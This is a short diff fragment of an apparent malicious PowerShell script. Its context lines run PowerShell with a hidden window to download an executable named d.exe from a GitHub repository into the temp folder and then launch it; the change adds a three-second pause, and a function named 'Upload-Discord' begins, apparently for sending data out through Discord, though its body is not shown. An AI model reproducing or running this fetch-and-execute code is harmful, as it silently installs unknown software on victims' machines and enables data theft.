@@ -3,6 +3,8 @@ powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/d.ex
 
 start-process "$env:TMP\d.exe"
 
+start-sleep 3
+
 function Upload-Discord {
 
 [CmdletBinding()]
